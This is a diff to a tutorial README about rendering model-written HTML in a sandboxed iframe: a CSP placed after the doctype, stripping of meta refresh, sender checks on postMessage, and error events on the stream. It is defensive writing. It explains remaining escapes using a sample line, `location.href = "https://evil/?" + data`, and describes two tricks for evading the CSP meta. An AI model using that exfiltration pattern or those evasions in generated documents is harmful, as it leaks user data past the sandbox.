@@ -166,10 +166,39 @@ export const HtmlArtifact = defineComponent({
 });
 ```
 
-The sandbox. `sandbox="allow-scripts"` gives the document a unique origin
-and no access to the host; the CSP, injected first in `<head>`, takes the
-network away from inline code too. A CSP the model wrote itself is
-removed first so the document cannot loosen the policy:
+The sandbox, precisely. Two mechanisms, each stopping different things:
+
+- `sandbox="allow-scripts"` on the iframe: the document runs in an opaque
+  origin with no access to the host page, its cookies or its storage;
+  forms cannot submit, popups and top-level navigation are blocked, no
+  modals. `referrerPolicy="no-referrer"` keeps the host URL out of any
+  request the document might still make.
+- The CSP `default-src 'none'; style-src 'unsafe-inline'; script-src
+  'unsafe-inline'; img-src data:`: inline code runs, and nothing loads or
+  connects. `<script src>`, `fetch()`, `XMLHttpRequest`, `WebSocket`,
+  `<img src="https://...">`, `@import`, web fonts: all blocked.
+
+What neither stops: the document navigating *itself*. `location.href =
+"https://evil/?" + data`, a plain `<a href>` click, or a `<meta
+http-equiv="refresh">` replace the sandboxed frame's content with an
+external page (CSP has no directive for the frame's own navigation, and
+`sandbox` only blocks top-level and popups). The frame is opaque-origin
+and holds only the model's own document, so the damage is a frame that
+shows someone else's page. `sandboxed()` strips the meta refresh; the
+other two are what `checkDocument()` and a code review are for.
+
+Where the meta goes matters. A CSP `<meta>` applies to what comes after
+it, so "first in `<head>`" sounds right, but the model writes the
+document: a `<script>` placed *before* `<head>` makes the HTML parser
+open `<head>` implicitly at the script and ignore the literal `<head>`
+later, so a policy inserted after that literal tag lands in `<body>`,
+where CSP metas are ignored; `<!-- <head> -->` puts it inside a comment.
+Searching for `<head>` is not safe against a document that controls its
+own markup. The policy goes right after the doctype instead, before any
+element: a `<meta>` before `<html>` is legal HTML, the parser opens
+`<html>` and `<head>` for it and merges the document's own tags into
+them. A CSP the model wrote itself is removed first so it cannot loosen
+ours (several CSPs would intersect anyway; removal keeps the check simple):
 
 `sandbox.mjs`:
 
@@ -179,16 +208,19 @@ export const CSP = "default-src 'none'; style-src 'unsafe-inline'; script-src 'u
 export const META = `<meta http-equiv="Content-Security-Policy" content="${CSP}">`;
 ...
 export function sandboxed(html) {
-  const cleaned = html.replace(CSP_META_RE, "");
-  const head = /<head[^>]*>/i.exec(cleaned);
-  if (head) return cleaned.slice(0, head.index + head[0].length) + META + cleaned.slice(head.index + head[0].length);
-  return META + cleaned;
+  const cleaned = html.replace(CSP_META_RE, "").replace(REFRESH_META_RE, "");
+  const doctype = DOCTYPE_RE.exec(cleaned);
+  const at = doctype ? doctype[0].length : 0;
+  return cleaned.slice(0, at) + META + cleaned.slice(at);
 }
 ...
 export function isEvent(data) {
   return data !== null && typeof data === "object" && data.type === "event" && typeof data.name === "string";
 }
 ```
+
+`tests/sandbox.test.mjs` pins the two evasions: a script before `<head>`
+and a `<head>` inside a comment both end up after the policy.
 
 The catalog and the prompt options. The rules are the example's
 `src/lib/prompt-options.ts`, with the two additions for this catalog:
@@ -213,16 +245,22 @@ export const PROMPT_OPTIONS = {
 ```
 
 The page's side of the iframe boundary. The document may post messages;
-the host keeps one shape and drops everything else:
+the host keeps one shape, from one sender, and never more than the last
+200. A `message` event can come from any window (another tab that holds a
+reference to this one, an extension), so `e.source` is compared with the
+artifact frames on the page; and a document looping `postMessage` must
+not grow React state forever:
 
 `app.mjs`:
 
 ```js
-  // Messages from the artifact iframe: keep the one accepted shape, drop the rest.
+  // Messages from the artifact iframe: only from a frame on this page, only the
+  // one accepted shape, and never more than the last MAX_EVENTS of them.
   useEffect(() => {
     const onMessage = (e) => {
       if (!isEvent(e.data)) return;
-      setEvents((list) => [...list, e.data.name]);
+      if (![...document.querySelectorAll("iframe.artifact-frame")].some((f) => f.contentWindow === e.source)) return;
+      setEvents((list) => [...list, e.data.name].slice(-MAX_EVENTS));
     };
     window.addEventListener("message", onMessage);
     return () => window.removeEventListener("message", onMessage);
@@ -247,18 +285,26 @@ share of the completion the document took:
             usage["completion_tokens"] = chunk.usage.completion_tokens
 ```
 
-The server stays a relay. The usage rides on the `done` event:
+The server stays a relay. The usage rides on the `done` event; a model
+call that fails part-way ends the stream with `event: error` and the
+reason, as in step 02, so the page always reaches a terminal state:
 
 `server.py`:
 
 ```python
         program, usage = [], {}
-        for delta in llm.stream_completion(messages_for(body.get("prompt", ""), self.system_prompt), usage):
-            program.append(delta)
-            self.wfile.write(f"data: {json.dumps(delta)}\n\n".encode())
-            self.wfile.flush()
-        LAST["program"], LAST["usage"] = "".join(program), usage
-        self.wfile.write(f"event: done\ndata: {json.dumps({'usage': usage})}\n\n".encode())
+        try:
+            for delta in llm.stream_completion(messages_for(body.get("prompt", ""), self.system_prompt), usage):
+                program.append(delta)
+                self.wfile.write(f"data: {json.dumps(delta)}\n\n".encode())
+                self.wfile.flush()
+            LAST["program"], LAST["usage"] = "".join(program), usage
+            self.wfile.write(f"event: done\ndata: {json.dumps({'usage': usage})}\n\n".encode())
+        except (ConnectionError, OSError):
+            return  # the tab closed; nothing to report
+        except Exception as error:  # noqa: BLE001 - the model call failed part-way: the page must hear why, not guess
+            LAST["program"], LAST["usage"] = "".join(program), usage
+            self.wfile.write(f"event: error\ndata: {json.dumps(f'{type(error).__name__}: {error}')}\n\n".encode())
 ```
 
 The Node test that pins the streaming behaviour: the partial document is
@@ -291,15 +337,67 @@ test("<Renderer> shows the status line and the raw source while streaming", () =
 });
 ```
 
+## Why: what breaks without it
+
+A catalog can only draw what it has a component for. Ask step 02's page
+for a tip calculator or a small game and the model either refuses or
+bends `Input` and `Button` into something that does not work, because no
+catalog component computes. Open-ended HTML is the report's other
+generation mode, and its cost is exactly what the sandbox is for: the
+model's code runs in the user's browser. Without `sandbox`, that code
+reads the host page; without the CSP, it phones home with whatever it
+found; without `isEvent()`, it drives the host's React state through
+`postMessage`. This step pays the open-ended cost for the one component
+that needs it and keeps the dashboard in the catalog.
+
 ## Run it
+
+Prerequisites: as step 02 (Node 20+, `npm install`, an API key in
+`API_KEY`/`OPENAI_API_KEY` or `~/.simple-harness/env`; Playwright's
+Chromium for `demo.py`). `tiktoken` for `artifact.count_tokens()` in the
+demo and one test; without it, or offline before its one-time vocabulary
+download, the count is a characters/4 estimate.
+
+bash:
 
 ```
 npm install                 # once; pinned versions, see package.json
 npm run prompt > prompt.txt # optional: python does this when the file is stale
+export API_KEY=sk-...
 python server.py            # builds static/bundle.js if needed, then http://127.0.0.1:8006/
 python demo.py              # two live prompts, three screenshots
 python -m pytest -q         # offline; runs npm install and npm test when needed
 ```
+
+PowerShell:
+
+```
+npm install
+npm run prompt | Out-File -Encoding utf8 prompt.txt   # optional
+$env:API_KEY = "sk-..."
+python server.py
+python demo.py
+python -m pytest -q
+```
+
+Expected output: the `Quick demo` transcript above; the line
+`iframe: sandbox='allow-scripts', CSP meta before any element: True` is
+the check that the sandbox was applied to the live document.
+
+## Error handling
+
+- A model call that fails (no key, network, the 120 s timeout): the
+  stream ends with `event: error`, the page shows the reason in `#error`
+  and keeps whatever arrived; `Generate` is enabled again. A non-200
+  answer from `/generate` is shown the same way.
+- A document over `MAX_DOCUMENT_CHARS` (200 000), or one that references
+  external resources, calls the network or carries a meta refresh:
+  `checkDocument()` lists the problems next to the artifact; the CSP
+  blocks the requests either way and the refresh is stripped.
+- A document that posts anything but `{type: "event", name}` from the
+  artifact frame is ignored; one that floods events keeps the last 200.
+- `node`/`npm` missing: one sentence from `nodetools.run`, no `TypeError`.
+- ctrl-c stops `server.py`.
 
 `npm install` runs the package's telemetry postinstall; `nodetools.py` sets
 `OPENUI_TELEMETRY_DISABLED=1` for every npm and node call it makes.
@@ -327,8 +425,28 @@ python -m pytest -q         # offline; runs npm install and npm test when needed
 - `HtmlArtifact` is rendered by React through `srcDoc`, so a re-parse that
   leaves the document unchanged does not reload the iframe. The Raw tab
   unmounts it, so the document's state resets on the way back.
+- The library validates prop types and drops offending elements
+  (`type-mismatch`), and a partial `HtmlArtifact("Counter"` with no
+  document yet is dropped with `missing-required`, so the renderer can
+  assume `props.document` is a string when it runs.
 - `Markdown` renders to React elements, never to an HTML string. Model
   text with `<img onerror=...>` in it comes out as text.
+
+## Gotchas / What this is not
+
+- The sandbox is not a security boundary against the *user's* machine
+  beyond what the browser gives every iframe; it is a boundary between the
+  model's code and the host page. The remaining exit is self-navigation
+  (see "The sandbox, precisely").
+- A CSP set by `<meta>` is set by the document's own markup, which the
+  model writes; the injection point above is chosen so the document
+  cannot get ahead of it, but a production host serves the artifact from
+  its own origin with a CSP *header* and does not rely on the meta.
+- One `LAST` program and usage on the server, one page at a time, as in
+  step 02.
+- The usage numbers depend on `stream_options.include_usage`, which not
+  every OpenAI-compatible proxy honours; then the `done` event carries
+  `{}` and the status line shows no token counts.
 
 ## Diff from the previous step
 
@@ -349,3 +467,8 @@ encoding.
 - `demo.py` runs two prompts and saves three screenshots; `test_step.py`
   gains the usage event, the artifact extraction and the CSP checks;
   `tests/sandbox.test.mjs` is new.
+
+## What the next step adds
+
+Part 05 changes the format: json-render, where the model streams JSON
+Patch lines into an element map and a Zod catalog validates every prop.
